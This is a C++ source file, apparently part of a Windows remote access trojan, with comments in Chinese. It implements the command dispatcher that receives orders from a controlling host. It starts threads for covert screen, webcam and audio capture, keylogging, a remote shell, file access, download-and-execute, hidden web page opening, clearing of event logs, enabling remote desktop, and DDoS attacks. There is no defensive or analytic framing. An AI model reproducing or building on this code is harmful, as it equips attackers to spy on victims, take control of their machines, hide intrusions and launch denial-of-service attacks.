// MyKernelManager.cpp: implementation of the CMyKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyKernelManager.h"
#include "loop.h"
#include "until.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

UINT	CMyKernelManager::m_nMasterPort = 80;
TCHAR	CMyKernelManager::m_strMasterHost[256] = { 0 };

extern TCHAR svcname[MAX_PATH];

bool CMyKernelManager::IsActived()
{
	return	m_bIsActived;
}

CMyKernelManager::CMyKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName,
	DWORD dwServiceType, LPCTSTR lpszKillEvent,
	LPCSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	if (lpszServiceName != NULL)
	{
		lstrcpy(m_strServiceName, svcname);
	}

	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		MultiByteToWideChar(CP_ACP, 0, lpszMasterHost, lstrlenA(lpszMasterHost) + 1, m_strMasterHost, 1024);

	m_nMasterPort = nMasterPort;
	m_dwServiceType = dwServiceType;
	m_nThreadCount = 0;

	// 初次连接，控制端发送命令表始激活
	m_bIsActived = false;

	// 创建一个监视键盘记录的线程
	// 键盘HOOK跟UNHOOK必须在同一个线程中
	//	m_hThread[m_nThreadCount++] =
	//	MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)Loop_HookKeyboard, NULL, 0,	NULL, true);
}

CMyKernelManager::~CMyKernelManager()
{
	for (unsigned int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
		Sleep(100);
	}
}

UINT BufSize;

// 加上激活
void CMyKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	BufSize = nSize;

	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:	// Active
		Activate();
		break;

	case COMMAND_LIST_DRIVE: // 文件管理
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyFileManager, (LPVOID)(lpBuffer + 1), 0, NULL);
		break;

	case COMMAND_SCREEN_SPY: // 屏幕查看
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyScreenManager, (LPVOID)(lpBuffer + 1), 0, NULL);
		break;

	case COMMAND_WEBCAM: // 摄像头
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyVideoManager, (LPVOID)(lpBuffer + 1), 0, NULL);
		break;

	case COMMAND_AUDIO: // 音频
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyAudioManager, (LPVOID)(lpBuffer + 1), 0, NULL);
		break;

	case COMMAND_SHELL: // 远程sehll
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyShellManager, (LPVOID)(lpBuffer + 1), 0, NULL);
		break;

	case COMMAND_PROXY: // 代理映射
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_ProxyManager, (LPVOID)(lpBuffer + 1), 0, NULL);
		break;

	case COMMAND_KEYBOARD:
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyKeyboardManager, (LPVOID)(lpBuffer + 1), 0, NULL);
		break;

	case COMMAND_SYSTEM:
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MySystemManager, (LPVOID)(lpBuffer + 1), 0, NULL);
		break;

	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
		break;

	case COMMAND_DOWN_EXEC: // 下载者
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyTools, (LPVOID)(lpBuffer), 0, NULL);
		Sleep(100); // 传递参数用
		break;

	case COMMAND_OPEN_URL_SHOW: // 显示打开网页
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyTools, (LPVOID)(lpBuffer), 0, NULL);
		break;

	case COMMAND_OPEN_URL_HIDE: // 隐藏打开网页
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyTools, (LPVOID)(lpBuffer), 0, NULL);
		break;

	case COMMAND_REMOVE: // 卸载,
		unsigned int i;
		for (i = 0; i < m_nThreadCount; i++)
		{
			TerminateThread(m_hThread[i], -1);
			CloseHandle(m_hThread[i]);
			Sleep(50);
		}
		ExitProcess(0);

		break;

	case COMMAND_CLEAN_EVENT: // 清除日志
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyTools, (LPVOID)(lpBuffer), 0, NULL);
		break;

	case COMMAND_SESSION:
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyTools, (LPVOID)(lpBuffer), 0, NULL);
		break;

	case COMMAND_RENAME_REMARK: // 改备注
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyTools, (LPVOID)(lpBuffer), 0, NULL);
		break;

	case COMMAND_UPDATE_SERVER: // 更新服务端
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyTools, (LPVOID)(lpBuffer), 0, NULL);
		break;

	case COMMAND_SORT_PROCESS: // 进程筛选
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyTools, (LPVOID)(lpBuffer), 0, NULL);
		break;

	case COMMAND_SORT_WINDOW: // 窗体筛选
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyTools, (LPVOID)(lpBuffer), 0, NULL);
		break;

	case COMMAND_OPEN_3389: // 开启3389
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyTools, (LPVOID)(lpBuffer), 0, NULL);
		break;

	case COMMAND_DDOS: // DDOS
		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyTools, (LPVOID)(lpBuffer), 0, NULL);
		break;
	}
}